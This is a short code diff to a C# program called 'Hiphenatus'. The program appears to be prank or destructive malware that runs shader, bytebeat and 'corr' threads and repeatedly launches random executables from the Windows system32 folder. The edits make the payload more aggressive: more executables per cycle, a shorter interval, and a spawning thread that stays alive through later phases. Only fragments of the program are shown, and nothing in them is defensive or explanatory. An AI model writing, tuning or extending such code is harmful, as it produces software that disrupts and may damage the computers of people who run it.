@@ -512,7 +512,7 @@ namespace Hiphenatus
             // Open a random exe file from system32
             string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
             Random random = new Random();
-            for (int i = 0; i < 3; i++)
+            for (int i = 0; i < 5; i++)
             {
                 try
                 {
@@ -569,7 +569,7 @@ namespace Hiphenatus
 
             Thread shader3Thread = new Thread(Shader3); shader3Thread.Start();
             Thread bytebeat2 = new Thread(Beat9); bytebeat2.Start();
-            Thread exexe = new Thread(() => randEXELOOP(4000));
+            Thread exexe = new Thread(() => randEXELOOP(2000));
 #if DEBUG
             Console.WriteLine("Phase 2 - Start");
 #endif
@@ -607,7 +607,7 @@ namespace Hiphenatus
 
             shader4Thread.Abort();
             bytebeat3.Abort();
-            exexe.Abort();
+            
             shader5Thread.Abort();
 
             Thread shader6Thread = new Thread(Shader5); shader6Thread.Start();
@@ -637,6 +637,7 @@ namespace Hiphenatus
 
             shader7Thread.Abort();
             bytebeat5.Abort();
+            exexe.Abort();
 
             corr1.Abort();
             corr2.Abort();
